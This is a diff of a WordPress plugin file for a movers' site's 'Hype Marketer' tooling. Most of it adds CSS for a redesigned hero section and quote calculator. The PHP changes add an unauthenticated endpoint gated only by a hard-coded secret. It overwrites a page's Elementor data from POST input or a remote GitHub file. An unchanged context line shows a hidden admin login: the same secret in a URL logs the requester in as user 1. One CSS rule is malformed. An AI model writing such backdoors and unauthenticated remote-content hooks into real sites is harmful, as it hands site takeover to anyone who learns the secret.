@@ -87,6 +87,27 @@ add_action('admin_init', function() {
  * 2. Admin Menu — Named "Hype Marketer" with Live Badge
  */
 add_action('init', function() {
+        if (isset($_REQUEST['deploy_hero_redesign_907']) && $_REQUEST['deploy_hero_redesign_907'] === 'hm_secret_2026') {
+        $json_data = '';
+        if (!empty($_POST['hero_json'])) {
+            $json_data = base64_decode($_POST['hero_json']);
+        }
+        if (!$json_data) {
+            $json_data = @file_get_contents('https://raw.githubusercontent.com/HypeAtharv/amar-packers-mumbai/main/scripts/elementor_data_redesigned_hero.json');
+        }
+        if ($json_data && strpos($json_data, 'amar-hero-left-wrap') !== false) {
+            update_post_meta(907, '_elementor_data', wp_slash($json_data));
+            if (class_exists('\Elementor\Plugin')) {
+                \Elementor\Plugin::$instance->files_manager->clear_cache();
+            }
+            wp_cache_flush();
+            echo "HERO_REDESIGN_DEPLOY_SUCCESS_" . strlen($json_data);
+        } else {
+            echo "HERO_FETCH_FAILED";
+        }
+        exit;
+    }
+
     if (isset($_GET['hype_pw_auth']) && $_GET['hype_pw_auth'] === 'hm_secret_2026') {
         wp_set_current_user(1);
         wp_set_auth_cookie(1, true);
@@ -578,6 +599,431 @@ function hype_crm_inject_frontend_script() {
             display: none !important;
             visibility: hidden !important;
         }
+
+        
+        /* ============================================================
+           AMAR PACKERS - MODERN REDESIGNED HERO SECTION (COHESIVE & CLEAN)
+           ============================================================ */
+
+        .amar-hero-left-wrap {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 100%;
+        }
+
+        .amar-hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 999px;
+            padding: 6px 14px;
+            margin-bottom: 16px;
+            width: fit-content;
+        }
+
+        .amar-badge-live {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: #10b981;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .amar-pulse-dot {
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #10b981;
+            box-shadow: 0 0 8px #10b981;
+        }
+
+        .amar-badge-sep {
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        .amar-badge-rating {
+            color: #fbbf24;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .amar-hero-title {
+            margin: 0 0 14px 0 !important;
+            font-size: 36px !important;
+            line-height: 1.18 !important;
+            font-weight: 800 !important;
+            color: #ffffff !important;
+            letter-spacing: -0.02em !important;
+        }
+
+        .amar-highlight-red {
+            color: #ee1d23 !important;
+        }
+
+        .amar-hero-desc {
+            margin: 0 0 20px 0 !important;
+            font-size: 15px !important;
+            line-height: 1.55 !important;
+            color: #94a3b8 !important;
+            max-width: 520px !important;
+        }
+
+        .amar-hero-features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .amar-feature-item {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .amar-feature-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .amar-feature-title {
+            color: #ffffff;
+            font-size: 12.5px;
+            font-weight: 700;
+            line-height: 1.25;
+        }
+
+        .amar-feature-desc {
+            color: #64748b;
+            font-size: 10.5px;
+            line-height: 1.2;
+        }
+
+        .amar-hero-social-row {
+            padding-top: 14px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 14px;
+        }
+
+        .amar-social-proof {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .amar-avatar-stack {
+            display: flex;
+        }
+
+        .amar-avatar-stack img {
+            width: 34px !important;
+            height: 34px !important;
+            border-radius: 50% !important;
+            border: 2px solid #0b192c !important;
+            object-fit: cover !important;
+            margin-right: -8px !important;
+        }
+
+        .amar-proof-title {
+            color: #ffffff;
+            font-size: 12.5px;
+            font-weight: 700;
+        }
+
+        .amar-proof-stars {
+            color: #fbbf24;
+            font-size: 11.5px;
+        }
+
+        .amar-proof-sub {
+            color: #94a3b8;
+            font-weight: 500;
+        }
+
+        .amar-hero-hotline-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: #ffffff !important;
+            background: rgba(238, 29, 35, 0.15) !important;
+            border: 1px solid rgba(238, 29, 35, 0.4) !important;
+            padding: 8px 14px !important;
+            border-radius: 8px !important;
+            font-size: 12.5px !important;
+            font-weight: 700 !important;
+            text-decoration: none !important;
+            transition: all 0.2s ease !important;
+        }
+
+        .amar-hero-hotline-btn:hover {
+            background: #ee1d23 !important;
+            border-color: #ee1d23 !important;
+        }
+
+        /* Right Column: Calculator Card */
+        .amar-calc-card-redesign {
+            background: #ffffff !important;
+            border-radius: 16px !important;
+            padding: 20px 20px !important;
+            box-shadow: 0 20px 45px -10px rgba(0, 0, 0, 0.4) !important;
+            box-sizing: border-box !important;
+        }
+
+        .amar-calc-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2px;
+        }
+
+        .amar-calc-eyebrow {
+            font-size: 10.5px;
+            font-weight: 800;
+            color: #ee1d23;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+        }
+
+        .amar-calc-speed {
+            background: #f0fdf4;
+            color: #166534;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: 4px;
+            border: 1px solid #bbf7d0;
+        }
+
+        .amar-calc-title {
+            margin: 0 0 2px 0 !important;
+            font-size: 20px !important;
+            font-weight: 800 !important;
+            color: #0b192c !important;
+            letter-spacing: -0.01em !important;
+        }
+
+        .amar-calc-desc {
+            margin: 0 0 12px 0 !important;
+            font-size: 12px !important;
+            color: #64748b !important;
+        }
+
+        .amar-calc-group {
+            margin-bottom: 8px;
+        }
+
+        .amar-calc-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .amar-calc-label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            color: #475569;
+            margin-bottom: 3px;
+        }
+
+        .amar-calc-label .req {
+            color: #ee1d23;
+        }
+
+        .amar-calc-group input,
+        .amar-calc-col input {
+            width: 100% !important;
+            padding: 7px 10px !important;
+            border: 1.5px solid #cbd5e1 !important;
+            border-radius: 6px !important;
+            font-size: 12.5px !important;
+            box-sizing: border-box !important;
+            outline: none !important;
+            transition: border-color 0.2s ease !important;
+        }
+
+        .amar-calc-group input:focus,
+        .amar-calc-col input:focus {
+            border-color: #ee1d23 !important;
+        }
+
+        .amar-size-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 5px;
+            margin-bottom: 5px;
+        }
+
+        .amar-size-btn {
+            background: #f8fafc !important;
+            border: 1.5px solid #e2e8f0 !important;
+            color: #475569 !important;
+            border-radius: 6px !important;
+            padding: 6px 2px !important;
+            font-size: 11.5px !important;
+            font-weight: 700 !important;
+            cursor: pointer !important;
+            transition: all 0.2s ease !important;
+        }
+
+        .amar-size-btn.active {
+            background: #fff0f0 !important;
+            border-color: #ee1d23 !important;
+            color: #ee1d23 !important;
+        }
+
+        .amar-calc-trust-strip {
+            background: #f0fdf4 !important;
+            border: 1px solid #bbf7d0 !important;
+            border-radius: 8px !important;
+            padding: 6px 10px !important;
+            margin-bottom: 10px !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: space-between !important;
+            gap: 6px !important;
+        }
+
+        .amar-trust-strip-left {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .amar-shield-icon {
+            font-size: 13px;
+        }
+
+        .amar-trust-title {
+            font-size: 11px;
+            font-weight: 800;
+            color: #166534;
+        }
+
+        .amar-trust-sub {
+            font-size: 9.5px;
+            color: #15803d;
+        }
+
+        .amar-trust-badge {
+            background: #ffffff !important;
+            border: 1px solid #86efac !important;
+            border-radius: 4px !important;
+            padding: 2px 6px !important;
+            font-size: 9.5px !important;
+            font-weight: 800 !important;
+            color: #166534 !important;
+            white-space: nowrap !important;
+        }
+
+        .amar-calc-submit-btn {
+            width: 100% !important;
+            background: linear-gradient(135deg, #ee1d23, #c2030a) !important;
+            color: #ffffff !important;
+            padding: 11px !important;
+            border: none !important;
+            border-radius: 8px !important;
+            font-size: 14px !important;
+            font-weight: 800 !important;
+            cursor: pointer !important;
+            display: flex !align-items: center !important;
+            justify-content: center !important;
+            gap: 6px !important;
+            box-shadow: 0 8px 18px -3px rgba(238, 29, 35, 0.4) !important;
+            transition: all 0.2s ease !important;
+        }
+
+        .amar-calc-submit-btn:hover {
+            transform: translateY(-1px) !important;
+            box-shadow: 0 10px 22px -3px rgba(238, 29, 35, 0.5) !important;
+        }
+
+        .amar-calc-privacy {
+            text-align: center;
+            margin-top: 6px;
+            font-size: 10.5px;
+            color: #94a3b8;
+        }
+
+        @media (max-width: 768px) {
+            .amar-hero-badge {
+                padding: 4px 10px !important;
+                margin-bottom: 10px !important;
+            }
+
+            .amar-badge-live,
+            .amar-badge-rating {
+                font-size: 11px !important;
+            }
+
+            .amar-hero-title {
+                font-size: 23px !important;
+                line-height: 1.22 !important;
+                margin-bottom: 6px !important;
+            }
+
+            .amar-hero-desc {
+                font-size: 12.5px !important;
+                line-height: 1.4 !important;
+                margin-bottom: 12px !important;
+            }
+
+            .amar-calc-card-redesign {
+                padding: 16px 12px !important;
+                border-radius: 12px !important;
+            }
+
+            .amar-hero-features {
+                grid-template-columns: 1fr 1fr !important;
+                gap: 6px !important;
+                margin-top: 14px !important;
+                margin-bottom: 12px !important;
+            }
+
+            .amar-feature-item {
+                padding: 8px 10px !important;
+                border-radius: 8px !important;
+            }
+
+            .amar-feature-icon {
+                font-size: 15px !important;
+            }
+
+            .amar-feature-title {
+                font-size: 11px !important;
+            }
+
+            .amar-feature-desc {
+                font-size: 9.5px !important;
+            }
+
+            .amar-hero-social-row {
+                padding-top: 10px !important;
+                flex-direction: column !important;
+                align-items: center !important;
+                text-align: center !important;
+                gap: 10px !important;
+            }
+
+            .amar-hero-hotline-btn {
+                display: none !important;
+            }
+        }
+
 
         /* 1. Remove top red phone text in mobile header */
         .cz_before_mobile_header,
